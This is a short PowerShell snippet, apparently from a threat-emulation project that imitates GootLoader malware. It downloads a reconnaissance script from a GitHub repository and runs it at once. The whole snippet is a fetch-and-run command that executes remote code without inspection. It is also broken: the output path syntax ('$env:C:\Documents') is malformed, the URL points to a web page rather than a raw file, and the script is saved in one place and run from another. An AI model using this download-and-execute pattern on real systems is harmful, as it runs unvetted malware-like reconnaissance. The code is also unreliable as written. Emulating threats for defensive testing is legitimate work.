$url = 'https://github.com/AMIKA-pl/GootLoader-ThreatEmulation/tree/main/PowerShell%20Scripts/EPRecon.ps1'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $env:C:\Documents\EPRecon.ps1 
Powershell.exe .\EPRecon.ps1